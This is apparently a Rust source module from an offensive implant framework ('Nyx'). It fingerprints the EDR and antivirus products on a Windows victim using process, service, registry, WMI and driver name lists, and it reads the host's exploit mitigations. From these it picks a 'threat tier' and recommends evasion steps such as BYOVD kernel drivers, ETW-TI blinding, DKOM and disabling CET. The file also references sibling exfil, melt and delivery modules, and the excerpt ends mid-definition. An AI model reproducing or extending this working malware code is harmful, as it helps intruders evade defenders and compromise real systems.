//! Nyx Target Reconnaissance Engine (T-REX) — National-tier APT target assessment
//!
//! # Design (informed by 2026 APT standards)
//!
//! CS-EDR-Enumeration (VirtualAllocEx, 2026): 6 noise-graded enumeration commands
//! S12 Kernel Recon (April 2026): BYOVD callback enumeration + Code Integrity detection
//! S12 ETW-TI Silencing (May 2026): ETW provider GUID + TI detection
//! eSentire Surveyor (2026): Full kernel analysis with symbol resolution
//! DbgMan EDR Tradecraft (2026): IPC endpoint mapping + registry callback analysis
//!
//! ## Six assessment tiers (noise-graded)
//!
//! | Tier | Noise | Technique | Privilege |
//! |------|-------|-----------|-----------|
//! | **T0** | ★☆☆☆☆ Silent | Process enumeration (Toolhelp32) | None |
//! | **T1** | ★☆☆☆☆ Silent | Service registry read (no SCManager) | None |
//! | **T2** | ★★☆☆☆ Low | WMI `AntiVirusProduct`/`Win32_Service` query | None |
//! | **T3** | ★★★☆☆ Medium | `OpenSCManagerW` + `EnumServicesStatusExW` | None |
//! | **T4** | ★★★★☆ High | Kernel module enumeration (`NtQuerySystemInformation` class 11) | Admin |
//! | **T5** | ★★★★★ BYOVD | Kernel callback enumeration + HVCI/CET probe | Admin + Driver |
//!
//! **T4-T5 are NOT implemented in this module (wI).** The kernel assessment is
//! operator-side: `operator-kernelsdk::assess_kernel` (driven by `nyx-kernel
//! assess`, BYOVD-backed) performs the real module enumeration, code-integrity,
//! callback-array and ETW-TI probe, verified on hosted Windows CI
//! (`.github/workflows/windows-byovd-hosted.yml`). This module covers the
//! user-mode tiers T0-T3 only.

#![cfg(target_os = "windows")]

pub mod melt;
pub mod scanners;

pub mod delivery;

use crate::heap::{vec, String, Vec};
use core::ffi::c_void;
pub mod cleanup;
pub mod exfil;

// ---- Decision Engine ------------------------------------------------------

/// Security posture verdict after assessment.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ThreatTier {
    /// No EDR/AV detected — user-mode evasion sufficient
    Clean = 0,
    /// Consumer AV only (Defender, Kaspersky, Norton) — byte-patch OK
    ConsumerAV = 1,
    /// Enterprise EDR detected (CrowdStrike, S1, Carbon Black) — HWBP blind needed
    EnterpriseEDR = 2,
    /// Kernel callbacks active + minifilters — kernel evasion recommended
    KernelArmed = 3,
    /// HVCI + CET + CFG strict — full APT toolkit required
    Fortress = 4,
    /// Unknown / assessment failed — abort or fallback
    Unknown = 0xFF,
}

impl ThreatTier {
    pub fn needs_hwbp(&self) -> bool {
        *self as u8 >= 2
    }
    pub fn needs_kernel(&self) -> bool {
        *self as u8 >= 3
    }
    pub fn needs_full_arsenal(&self) -> bool {
        *self as u8 >= 4
    }
}

/// Complete target assessment report.
pub struct TargetAssessment {
    pub tier: ThreatTier,
    pub products: Vec<DetectedProduct>,
    pub mitigations: MitigationFlags,
    pub recommendation: &'static str,
}

/// Detected security product.
#[derive(Debug, Clone)]
pub struct DetectedProduct {
    pub vendor: Vendor,
    pub product_name: &'static str,
    pub detection_method: DetectionMethod,
    pub process_count: u32,
    pub driver_count: u32,
    pub service_count: u32,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Vendor {
    // Tier 1 EDR
    CrowdStrike,
    SentinelOne,
    MicrosoftDefenderATP,
    CarbonBlack,
    ElasticEDR,
    CortexXDR,
    Cybereason,
    TrendMicroApex,
    SophosInterceptX,
    // Tier 2 AV
    Defender,
    Kaspersky,
    McAfee,
    Symantec,
    ESET,
    Bitdefender,
    Malwarebytes,
    Avast,
    Norton,
    // Infrastructure
    Sysmon,
    Velociraptor,
    Osquery,
    Tanium,
    // Unknown
    Unknown,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DetectionMethod {
    ProcessName,
    ServiceName,
    DriverName,
    WMIAntivirusProduct,
    RegistryPath,
    KernelCallback,
    InstallDirectory,
}

/// Process mitigation flags — queried via GetProcessMitigationPolicy.
#[derive(Debug, Clone, Copy, Default)]
pub struct MitigationFlags {
    pub dep_enabled: bool,
    pub aslr_high_entropy: bool,
    pub cfg_enabled: bool,
    pub cfg_strict: bool,
    pub cet_shadow_stack: bool,
    pub cet_strict: bool,
    pub acg_enabled: bool, // Arbitrary Code Guard
    pub cig_enabled: bool, // Code Integrity Guard
    pub dynamic_code_prohibited: bool,
    pub signature_required: bool, // Microsoft Signed Only
    pub hvci_enabled: bool,       // Hypervisor Code Integrity
    pub vbs_enabled: bool,        // Virtualization-Based Security
    pub dma_guard_enabled: bool,  // Kernel DMA Protection
    pub secure_boot: bool,
}

// ---- Public API -----------------------------------------------------------
/// Whether the T-REX user-mode scanners are backed by real syscall resolvers.
///
/// Set to `true` as of 2026-07-14: T0 (process enumeration via Toolhelp32) and
/// T3 (service manager enumeration via SCM) are implemented with PEB-walk-
/// resolved Win32 APIs. T2 (WMI) landed 2026-07-18: `wmi_query_av_products`
/// queries `root\SecurityCenter2:AntiVirusProduct` via hand-rolled COM (the
/// `wmi`/`windows` crates are out — implant is no_std PIC), and
/// `wmi_query_services`/`wmi_query_drivers` query `root\CIMV2`. T1 (registry)
/// landed 2026-07-18: `scan_service_registry` walks
/// `HKLM\SYSTEM\CurrentControlSet\Services` via the ANSI advapi32 entrypoints
/// (RegOpenKeyExA/RegEnumKeyExA/RegQueryValueExA) — silent registry reads, no
/// SCM RPC. `wmi_query_drivers` now uses the dedicated `match_driver_name`
/// matcher (kernel-driver naming space) instead of the service-name DB.
/// Mitigation queries (CFG/CET/DEP/ASLR) are also live.
///
/// `assess_user_mode` will correctly detect EDR/AV products via process names,
/// service names from the SCM, registry DisplayName/ImagePath values, and WMI-
/// registered AV products. The Tier will be accurate — no more UNIMPLEMENTED
/// banner.
const TREX_SCANNERS_IMPLEMENTED: bool = true;

/// Run a full T0-T3 assessment (no kernel driver needed).
/// Returns the highest noise tier that succeeded.
pub unsafe fn assess_user_mode() -> TargetAssessment {
    let mut assessment = TargetAssessment {
        tier: ThreatTier::Clean,
        products: Vec::with_capacity(16),
        mitigations: MitigationFlags::default(),
        recommendation: "Continue with user-mode evasion",
    };
    // ⚠ T-REX RECON UNIMPLEMENTED (P0-6): every scan_* helper below is a stub
    // (returns null / no-op), so no products are ever detected and the tier
    // would resolve to Clean even on fortified hosts. Surface this honestly:
    // force Unknown + an explicit banner until the real scanners land.
    if !TREX_SCANNERS_IMPLEMENTED {
        assessment.tier = ThreatTier::Unknown;
        assessment.recommendation = "⚠ T-REX RECON UNIMPLEMENTED: output is NOT \
            trustworthy. Assessment may show Clean even on fortified hosts. \
            Do not base evasion decisions on this.";
        return assessment;
    }

    // === T0: Process name scanning (silent) ===
    scan_processes(&mut assessment);

    // === T1: Service registry read (silent) ===
    scan_service_registry(&mut assessment);

    // === T2: WMI queries (low noise) ===
    scan_wmi(&mut assessment);

    // === T3: Service Manager enumeration (medium noise) ===
    scan_service_manager(&mut assessment);

    // === Mitigation query (always available) ===
    query_mitigations(&mut assessment.mitigations);

    // === Determine threat tier ===
    assessment.tier = determine_tier(&assessment);
    assessment.recommendation = recommend(&assessment);

    assessment
}

// ---- T0: Process Name Scanning --------------------------------------------

unsafe fn scan_processes(assessment: &mut TargetAssessment) {
    // Resolve CreateToolhelp32Snapshot + Process32FirstW/Process32NextW
    // Walk all processes, match against known EDR binary names
    let snapshot = create_toolhelp_snapshot();
    if snapshot.is_null() {
        return;
    }

    let mut pe = core::mem::zeroed::<ProcessEntry32W>();
    pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;

    if process32_first(snapshot, &mut pe) == 0 {
        return;
    }

    loop {
        let name = wide_to_utf8(pe.exe_file.as_ptr());
        if let Some(vendor) = match_process_name(&name) {
            let product = DetectedProduct {
                vendor,
                product_name: vendor.default_name(),
                detection_method: DetectionMethod::ProcessName,
                process_count: 1,
                driver_count: 0,
                service_count: 0,
            };
            merge_or_push(&mut assessment.products, product);
        }
        pe.dw_size = core::mem::size_of::<ProcessEntry32W>() as u32;
        if process32_next(snapshot, &mut pe) == 0 {
            break;
        }
    }

    close_handle(snapshot);
}

// ---- T1: Service Registry Read --------------------------------------------

unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
    // Read HKLM\SYSTEM\CurrentControlSet\Services
    // Match ImagePath / DisplayName against known EDR patterns
    // No SCManager = no EDR telemetry
    let key = open_registry_key(b"SYSTEM\\CurrentControlSet\\Services");
    if key.is_null() {
        return;
    }

    let mut index: u32 = 0;
    loop {
        // RegEnumKeyExA writes ASCII subkey names. The buffer is reused across
        // iterations; we trust the API to NUL-terminate within `name_len`.
        let mut name_buf = [0u8; 256];
        let mut name_len = name_buf.len() as u32;
        let st = reg_enum_key(key, index, name_buf.as_mut_ptr() as *mut u16, &mut name_len);
        if st != scanners::ERROR_SUCCESS {
            break;
        }
        // ERROR_SUCCESS implies at least one byte; defensively bound the slice.
        let actual = (name_len as usize).min(name_buf.len());
        let subkey_name = ascii_slice_to_string(&name_buf[..actual]);

        let subkey = open_registry_subkey(key, &subkey_name);
        if !subkey.is_null() {
            // Read DisplayName + ImagePath
            let display = query_reg_value(subkey, b"DisplayName");
            let image = query_reg_value(subkey, b"ImagePath");
            if let Some(vendor) = match_service_pattern(&display, &image) {
                let product = DetectedProduct {
                    vendor,
                    product_name: vendor.default_name(),
                    detection_method: DetectionMethod::ServiceName,
                    process_count: 0,
                    driver_count: 0,
                    service_count: 1,
                };
                merge_or_push(&mut assessment.products, product);
            }
            close_registry_key(subkey);
        }

        index += 1;
    }
    close_registry_key(key);
}

// ---- T2: WMI Query --------------------------------------------------------

unsafe fn scan_wmi(assessment: &mut TargetAssessment) {
    // T2 (low noise): three WQL queries via hand-rolled COM — see the
    // wmi_query_* bodies below for the pipeline and OPSEC caveats.
    //   - AntiVirusProduct  (root\SecurityCenter2) — primary AV detection
    //   - Win32_Service     (root\CIMV2)           — running services
    //   - Win32_SystemDriver(root\CIMV2)           — running kernel drivers
    // The FFI primitives live in scanners.rs (CoInitializeEx → ConnectServer →
    // ExecQuery → Next → Get). Call order matters: run after evasion init so
    // the DCOM activation + ExecQuery are uninstrumented.
    wmi_query_av_products(assessment);
    wmi_query_services(assessment);
    wmi_query_drivers(assessment);
}

// ---- T3: Service Manager Enumeration --------------------------------------

unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
    // OpenSCManagerW + EnumServicesStatusExW
    // Match service display names + binary paths against EDR patterns
    let scm = open_sc_manager();
    if scm.is_null() {
        return;
    }

    let needed = match scan_service_manager_probe_size(scm) {
        Some(n) => n,
        None => {
            close_sc_manager(scm);
            return;
        }
    };

    let buf = alloc(needed as usize);
    if buf.is_null() {
        close_sc_manager(scm);
        return;
    }

    scan_service_manager_collect(scm, buf, needed, assessment);

    free(buf);
    close_sc_manager(scm);
}

/// First EnumServicesStatusExW call: queries the required buffer size.
unsafe fn scan_service_manager_probe_size(scm: Handle) -> Option<u32> {
    let mut needed: u32 = 0;
    let mut returned: u32 = 0;
    let mut resume: u32 = 0;

    // First call: get buffer size
    enum_services_status_ex(
        scm,
        0, // SC_ENUM_PROCESS_INFO
        0, // SERVICE_WIN32
        3, // SERVICE_STATE_ALL
        core::ptr::null_mut(),
        0,
        &mut needed,
        &mut returned,
        &mut resume,
        core::ptr::null(),
    );

    if needed == 0 {
        return None;
    }
    Some(needed)
}

/// Second EnumServicesStatusExW call; merges matched services into the assessment.
unsafe fn scan_service_manager_collect(
    scm: Handle,
    buf: *mut u8,
    needed: u32,
    assessment: &mut TargetAssessment,
) {
    let mut needed = needed;
    let mut returned: u32 = 0;
    let mut resume: u32 = 0;
    if enum_services_status_ex(
        scm,
        0,
        0,
        3,
        buf,
        needed,
        &mut needed,
        &mut returned,
        &mut resume,
        core::ptr::null(),
    ) == 0
    {
        // Enumerate returned entries — match patterns
        for i in 0..returned as usize {
            let entry = &*(buf.add(i * core::mem::size_of::<EnumServiceStatusProcessW>())
                as *const EnumServiceStatusProcessW);
            let name = wide_slice_to_utf8(core::slice::from_raw_parts(
                entry.service_name,
                wcslen(entry.service_name),
            ));
            if let Some(vendor) = match_service_name(&name) {
                let product = DetectedProduct {
                    vendor,
                    product_name: vendor.default_name(),
                    detection_method: DetectionMethod::ServiceName,
                    process_count: 0,
                    driver_count: 0,
                    service_count: 1,
                };
                merge_or_push(&mut assessment.products, product);
            }
        }
    }
}

// ---- Mitigation Query -----------------------------------------------------

unsafe fn query_mitigations(flags: &mut MitigationFlags) {
    // GetProcessMitigationPolicy for each category:
    // ProcessDEPPolicy (1)         → flags.dep_enabled
    // ProcessASLRPolicy (2)        → flags.aslr_high_entropy
    // ProcessControlFlowGuardPolicy (8) → flags.cfg_enabled, strict
    // ProcessUserShadowStackPolicy (14) → flags.cet_shadow_stack, strict
    // ProcessDynamicCodePolicy (5) → flags.dynamic_code_prohibited
    // ProcessSignaturePolicy (6)   → flags.signature_required
    // ProcessImageLoadPolicy (9)   → flags.acg_enabled, cig_enabled

    query_dep(flags);
    query_aslr(flags);
    query_cfg(flags);
    query_cet(flags);
    query_dynamic_code(flags);
    query_signature(flags);
    query_image_load(flags);
}

fn query_cfg(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct CfgPolicy {
        flags: u32,
        _reserved: u32,
        strict_flags: u32,
        _pad: u32,
    }
    let mut policy = CfgPolicy {
        flags: 0,
        _reserved: 0,
        strict_flags: 0,
        _pad: 0,
    };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void, // GetCurrentProcess
            8,                                 // ProcessControlFlowGuardPolicy
            &mut policy as *mut CfgPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<CfgPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.cfg_enabled = (policy.flags & 1) != 0;
        flags.cfg_strict = (policy.strict_flags & 1) != 0;
    }
}

fn query_cet(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct CetPolicy {
        flags: u32,
        _pad: u32,
        strict_mode_flags: u32,
        _pad2: u32,
        _reserved: [u32; 8],
    }
    let mut policy = CetPolicy {
        flags: 0,
        _pad: 0,
        strict_mode_flags: 0,
        _pad2: 0,
        _reserved: [0; 8],
    };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            14, // ProcessUserShadowStackPolicy
            &mut policy as *mut CetPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<CetPolicy>() as u32,
        )
    };
    if ok != 0 {
        // flags bit 0 = EnableUserShadowStack, bit 1 = EnableUserShadowStackStrictMode
        flags.cet_shadow_stack = (policy.flags & (1 << 0)) != 0;
        flags.cet_strict = (policy.flags & (1 << 1)) != 0;
    }
}

fn query_dep(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct DepPolicy {
        flags: u32,
        _permanent: u32,
    }
    let mut policy = DepPolicy {
        flags: 0,
        _permanent: 0,
    };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            1,
            &mut policy as *mut DepPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<DepPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.dep_enabled = (policy.flags & 1) != 0;
    }
}

fn query_aslr(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct AslrPolicy {
        flags: u32,
    }
    let mut policy = AslrPolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            2,
            &mut policy as *mut AslrPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<AslrPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.aslr_high_entropy = (policy.flags & (1 << 0)) != 0;
    }
}

fn query_dynamic_code(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct DynCodePolicy {
        flags: u32,
    }
    let mut policy = DynCodePolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            5,
            &mut policy as *mut DynCodePolicy as *mut core::ffi::c_void,
            core::mem::size_of::<DynCodePolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.dynamic_code_prohibited = (policy.flags & 1) != 0;
    }
}

fn query_signature(flags: &mut MitigationFlags) {
    #[repr(C)]
    struct SigPolicy {
        flags: u32,
    }
    let mut policy = SigPolicy { flags: 0 };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            6,
            &mut policy as *mut SigPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<SigPolicy>() as u32,
        )
    };
    if ok != 0 {
        flags.signature_required = (policy.flags & 1) != 0;
    }
}

fn query_image_load(_flags: &mut MitigationFlags) {
    #[repr(C)]
    struct ImgLoadPolicy {
        flags: u32,
        _pad1: u32,
        _pad2: u32,
        _pad3: u32,
    }
    let mut policy = ImgLoadPolicy {
        flags: 0,
        _pad1: 0,
        _pad2: 0,
        _pad3: 0,
    };
    let ok = unsafe {
        get_process_mitigation_policy(
            -1isize as *mut core::ffi::c_void,
            9,
            &mut policy as *mut ImgLoadPolicy as *mut core::ffi::c_void,
            core::mem::size_of::<ImgLoadPolicy>() as u32,
        )
    };
    // ProcessImageLoadPolicy bits: NoLowLabel=0, NoRemote=1, NoUnsigned=2, PreferSystem32=3
    // These are image-load restrictions, NOT ACG/CIG. ACG is ProcessDynamicCodePolicy (class 5),
    // CIG is ProcessSignaturePolicy (class 6) — both queried separately above.
    // There are no image-load-specific fields in MitigationFlags, so leave flags at defaults.
    if ok != 0 {
        // Image-load restrictions (NoLowLabel/NoRemote/NoUnsigned/PreferSystem32) are not
        // represented in MitigationFlags; intentionally no assignments here.
    }
}

// ---- Decision Engine ------------------------------------------------------

fn determine_tier(assessment: &TargetAssessment) -> ThreatTier {
    let has_enterprise_edr = assessment.products.iter().any(|p| {
        matches!(
            p.vendor,
            Vendor::CrowdStrike
                | Vendor::SentinelOne
                | Vendor::MicrosoftDefenderATP
                | Vendor::CarbonBlack
                | Vendor::ElasticEDR
                | Vendor::CortexXDR
                | Vendor::Cybereason
                | Vendor::TrendMicroApex
                | Vendor::SophosInterceptX
        )
    });
    let has_av = assessment.products.iter().any(|p| {
        matches!(
            p.vendor,
            Vendor::Defender
                | Vendor::Kaspersky
                | Vendor::McAfee
                | Vendor::Symantec
                | Vendor::ESET
                | Vendor::Bitdefender
                | Vendor::Malwarebytes
                | Vendor::Avast
                | Vendor::Norton
        )
    });

    if has_enterprise_edr {
        if assessment.mitigations.cet_strict || assessment.mitigations.hvci_enabled {
            ThreatTier::Fortress
        } else if assessment.mitigations.cfg_enabled {
            ThreatTier::KernelArmed
        } else {
            ThreatTier::EnterpriseEDR
        }
    } else if has_av {
        ThreatTier::ConsumerAV
    } else {
        ThreatTier::Clean
    }
}

fn recommend(assessment: &TargetAssessment) -> &'static str {
    match assessment.tier {
        ThreatTier::Clean =>
            "Minimal: indirect syscalls + sleep obfuscation sufficient. No kernel evasion needed.",
        ThreatTier::ConsumerAV =>
            "Low: byte-patch blind + Fluctuation sleep mask. BYOVD not recommended (overkill).",
        ThreatTier::EnterpriseEDR =>
            "Medium: HWBP blind + CFG bypass + DR sanitization + LACUNA ghost frames. Kernel evasion optional.",
        ThreatTier::KernelArmed =>
            "High: Full Nyx evasion stack. BYOVD kernel layer recommended (ETW-TI blind + DKOM + callback repurpose).",
        ThreatTier::Fortress =>
            "CRITICAL: CET + HVCI detected. Kernel CET disable required. Consider target reselection if operational security is paramount.",
        ThreatTier::Unknown =>
            "Assessment failed. Retry with elevated privileges or different entry vector.",
    }
}

// ---- Vendor Matching Database ---------------------------------------------

impl Vendor {
    pub fn default_name(self) -> &'static str {
        match self {
            Vendor::CrowdStrike => "CrowdStrike Falcon",
            Vendor::SentinelOne => "SentinelOne",
            Vendor::MicrosoftDefenderATP => "Microsoft Defender for Endpoint",
            Vendor::CarbonBlack => "Carbon Black",
            Vendor::ElasticEDR => "Elastic EDR",
            Vendor::CortexXDR => "Cortex XDR",
            Vendor::Cybereason => "Cybereason",
            Vendor::TrendMicroApex => "Trend Micro Apex One",
            Vendor::SophosInterceptX => "Sophos Intercept X",
            Vendor::Defender => "Microsoft Defender",
            Vendor::Kaspersky => "Kaspersky",
            Vendor::McAfee => "McAfee",
            Vendor::Symantec => "Symantec Endpoint Protection",
            Vendor::ESET => "ESET",
            Vendor::Bitdefender => "Bitdefender",
            Vendor::Malwarebytes => "Malwarebytes",
            Vendor::Avast => "Avast",
            Vendor::Norton => "Norton",
            Vendor::Sysmon => "Sysmon",
            Vendor::Velociraptor => "Velociraptor",
            Vendor::Osquery => "osquery",
            Vendor::Tanium => "Tanium",
            Vendor::Unknown => "Unknown",
        }
    }
}

/// Match process name → vendor. Updated to 2026 EDR/AV process names.
fn match_process_name(name: &str) -> Option<Vendor> {
    let lower = name.to_lowercase();
    match_process_name_tier1(&lower)
        .or_else(|| match_process_name_tier2(&lower))
        .or_else(|| match_process_name_infra(&lower))
}

/// Tier 1 EDR — 2026 process names
fn match_process_name_tier1(lower: &str) -> Option<Vendor> {
    if lower.contains("csfalcon") || lower.contains("csagent") {
        return Some(Vendor::CrowdStrike);
    }
    if lower.contains("sentinelagent") || lower.contains("sentinelone") {
        return Some(Vendor::SentinelOne);
    }
    // MsSense runs only in Defender for Endpoint (ATP/EDR); MsMpEng runs in both
    // consumer Defender and ATP. So MsSense → ATP, MsMpEng alone → Defender.
    if lower.contains("mssense") {
        return Some(Vendor::MicrosoftDefenderATP);
    }
    if lower.contains("cbdefense") || lower.contains("cb.exe") || lower.contains("repmgr") {
        return Some(Vendor::CarbonBlack);
    }
    if lower.contains("elastic-endpoint") || lower.contains("elastic-agent") {
        return Some(Vendor::ElasticEDR);
    }
    if lower.contains("traps") || lower.contains("cyserver") || lower.contains("cytray") {
        return Some(Vendor::CortexXDR);
    }
    if lower.contains("cybereason") || lower.contains("minionhost") {
        return Some(Vendor::Cybereason);
    }
    if lower.contains("tmccsf") || lower.contains("ntrtscan") || lower.contains("pccntmon") {
        return Some(Vendor::TrendMicroApex);
    }
    if lower.contains("sophos") || lower.contains("savservice") || lower.contains("hmpalert") {
        return Some(Vendor::SophosInterceptX);
    }
    None
}

/// Tier 2 AV
fn match_process_name_tier2(lower: &str) -> Option<Vendor> {
    if lower.contains("msmpeng") {
        return Some(Vendor::Defender);
    }
    if lower.contains("avp") || lower.contains("kavtray") || lower.contains("klnagent") {
        return Some(Vendor::Kaspersky);
    }
    if lower.contains("mcshield") || lower.contains("mfefire") || lower.contains("mcafeefire") {
        return Some(Vendor::McAfee);
    }
    if lower.contains("smc")
        || lower.contains("symcorp")
        || lower.contains("rtvscan")
        || lower.contains("ccsvchst")
    {
        return Some(Vendor::Symantec);
    }
    if lower.contains("ekrn") || lower.contains("egui") {
        return Some(Vendor::ESET);
    }
    if lower.contains("bdagent") || lower.contains("vsserv") {
        return Some(Vendor::Bitdefender);
    }
    if lower.contains("mbamservice") || lower.contains("mbamtray") {
        return Some(Vendor::Malwarebytes);
    }
    if lower.contains("avastsvc") || lower.contains("avastui") {
        return Some(Vendor::Avast);
    }
    if lower.contains("nsbu") || lower.contains("navw32") {
        return Some(Vendor::Norton);
    }
    None
}

/// Infrastructure
fn match_process_name_infra(lower: &str) -> Option<Vendor> {
    if lower.contains("sysmon") {
        return Some(Vendor::Sysmon);
    }
    if lower.contains("velociraptor") {
        return Some(Vendor::Velociraptor);
    }
    if lower.contains("osqueryd") {
        return Some(Vendor::Osquery);
    }
    if lower.contains("tanium") {
        return Some(Vendor::Tanium);
    }
    None
}

fn match_service_name(name: &str) -> Option<Vendor> {
    let lower = name.to_lowercase();
    if lower.contains("csagent") || lower.contains("csfalcon") {
        return Some(Vendor::CrowdStrike);
    }
    if lower.contains("sentinelagent") {
        return Some(Vendor::SentinelOne);
    }
    if lower.contains("sense") || lower.contains("wdav") || lower.contains("windefend") {
        return Some(Vendor::MicrosoftDefenderATP);
    }
    if lower.contains("cbdefense") || lower.contains("carbonblack") {
        return Some(Vendor::CarbonBlack);
    }
    if lower.contains("elastic") && lower.contains("endpoint") {
        return Some(Vendor::ElasticEDR);
    }
    if lower.contains("cybereason") {
        return Some(Vendor::Cybereason);
    }
    if lower.contains("sophos") {
        return Some(Vendor::SophosInterceptX);
    }
    if lower.contains("avp") || lower.contains("kaspersky") {
        return Some(Vendor::Kaspersky);
    }
    if lower.contains("mcshield") || lower.contains("mcafee") {
        return Some(Vendor::McAfee);
    }
    if lower.contains("symantec") || lower.contains("sep") {
        return Some(Vendor::Symantec);
    }
    if lower.contains("ekrn") || lower.contains("eset") {
        return Some(Vendor::ESET);
    }
    if lower.contains("bitdefender") || lower.contains("bdredline") {
        return Some(Vendor::Bitdefender);
    }
    None
}

fn match_service_pattern(display: &str, image: &str) -> Option<Vendor> {
    match_service_name(display).or_else(|| match_process_name(image))
}

/// Match a Windows kernel driver name → vendor.
///
/// Split off from `match_service_name` because drivers and services use
/// different naming conventions and the service substring set produces both
/// false positives (e.g. service-substring `"sense"` matches the unrelated
/// `Sensor servo` driver, `"sep"` matches any `*.sep` inf) and false negatives
/// (real EDR drivers use the kernel-driver naming space: `.sys` suffix, vendor
/// prefixes absent from the service list). This is the string-level matcher
/// used by the T2 WMI `Win32_SystemDriver` query; the byte-level twin used by
/// the operator-side kernel module enumerator lives in `operator-kernelsdk`
/// (`win::assess::is_edr_driver_name`).
///
/// Rules (informed by 2026 EDR driver naming, see EDRSandblast / eSentire
/// Surveyor driver name lists):
///   - CrowdStrike: `csagent`, `csdevice` (the Falcon sensor + filter driver)
///   - SentinelOne: `sentinel` + (`monitor`|`visor`), or the `sqm`-style
///     `sentinelone` prefix
///   - Defender ATP: `wdfilter`, `windefend` (the kernel anti-malware engine +
///     minifilter; `wdnisdrv` is the network inspection driver)
///   - Carbon Black: `cbfs`, `carbon`, `cbknc` (Cb Defense file-system filter)
///   - Elastic: `elastic` + (`defend`|`endpoint`)
///   - Cortex XDR: `cortex`, `traps` (the Traps-era kernel driver names)
///   - Sophos: `sophos` + (`bp`|`boot`|`eld`|`spt`) — the Sophos kernel drivers
///   - Kaspersky: `klif`, `klam`, `klick`, `kltdi` (the KL* driver family)
///   - McAfee: `mfe`*, `mfenc` (Heartbeat / Encrypted firewall drivers)
///   - Symantec: `symefa`, `symevnt`, `symcorpu`, `srtsp` (SONAR / EFA drivers)
///   - ESET: `eamonm`, `ehdrv`, `epfw`, `epfwwfp` (ESET kernel drivers)
///   - Bitdefender: `bdvedisk`, `trufos`, `bdfndlf` (the Trufos / filesystem
///     filter drivers)
///   - Sysmon: `sysmondrv` (Sysmon's kernel data-provider driver)
///   - Trend Micro: `tmact`, `tmebc`, `tmbmsrv` (the OfficeScan/Apex drivers)
///
/// Substrings are deliberately vendor-specific (multi-token where a single
/// token like `mfe` would over-match) so a generic Windows driver like
/// `tcpip.sys` or `ntfs.sys` never matches. The `.sys` suffix itself is NOT
/// used as a token — every kernel driver has it.
fn match_driver_name(name: &str) -> Option<Vendor> {
    let lower = name.to_lowercase();
    match_driver_name_edr(&lower)
        .or_else(|| match_driver_name_av(&lower))
        .or_else(|| match_driver_name_infra(&lower))
}

/// EDR kernel-driver names.
fn match_driver_name_edr(lower: &str) -> Option<Vendor> {
    if lower.contains("csagent") || lower.contains("csdevice") {
        return Some(Vendor::CrowdStrike);
    }
    if lower.contains("sentinelone")
        || (lower.contains("sentinel") && (lower.contains("monitor") || lower.contains("visor")))
    {
        return Some(Vendor::SentinelOne);
    }
    if lower.contains("wdfilter") || lower.contains("windefend") || lower.contains("wdnisdrv") {
        return Some(Vendor::MicrosoftDefenderATP);
    }
    if lower.contains("cbfs") || lower.contains("carbon") || lower.contains("cbknc") {
        return Some(Vendor::CarbonBlack);
    }
    if lower.contains("elastic") && (lower.contains("defend") || lower.contains("endpoint")) {
        return Some(Vendor::ElasticEDR);
    }
    if lower.contains("cortex") || lower.contains("traps") {
        return Some(Vendor::CortexXDR);
    }
    None
}

/// AV kernel-driver names.
fn match_driver_name_av(lower: &str) -> Option<Vendor> {
    if lower.contains("sophos")
        && (lower.contains("bp")
            || lower.contains("boot")
            || lower.contains("eld")
            || lower.contains("spt"))
    {
        return Some(Vendor::SophosInterceptX);
    }
    if lower.contains("klif")
        || lower.contains("klam")
        || lower.contains("klick")
        || lower.contains("kltdi")
    {
        return Some(Vendor::Kaspersky);
    }
    if lower.contains("mfenc") || lower.contains("mfeh") || lower.contains("mfefirek") {
        return Some(Vendor::McAfee);
    }
    if lower.contains("symefa")
        || lower.contains("symevnt")
        || lower.contains("symcorpu")
        || lower.contains("srtsp")
    {
        return Some(Vendor::Symantec);
    }
    if lower.contains("eamonm") || lower.contains("ehdrv") || lower.contains("epfw") {
        return Some(Vendor::ESET);
    }
    if lower.contains("bdvedisk") || lower.contains("trufos") || lower.contains("bdfndlf") {
        return Some(Vendor::Bitdefender);
    }
    if lower.contains("tmact") || lower.contains("tmebc") || lower.contains("tmbmsrv") {
        return Some(Vendor::TrendMicroApex);
    }
    None
}

/// Infrastructure kernel-driver names.
fn match_driver_name_infra(lower: &str) -> Option<Vendor> {
    if lower.contains("sysmondrv") {
        return Some(Vendor::Sysmon);
    }
    None
}

// ---- Internal helpers (stubs — resolved via PEB walk at runtime) ----------

type Handle = *mut core::ffi::c_void;
type HKey = *mut core::ffi::c_void;

// ---- Internal helpers (delegated to scanners module) -----------------------

#[repr(C)]
struct ProcessEntry32W {
    pub dw_size: u32,
    pub cnt_usage: u32,
    pub th32_process_id: u32,
    pub th32_default_heap_id: usize,
    pub th32_module_id: u32,
    pub cnt_threads: u32,
    pub th32_parent_process_id: u32,
    pub pc_pri_class_base: i32,
    pub dw_flags: u32,
    pub exe_file: [u16; 260],
}

#[repr(C)]
struct EnumServiceStatusProcessW {
    pub service_name: *mut u16,
    pub display_name: *mut u16,
    pub service_status: ServiceStatusProcess,
}

#[repr(C)]
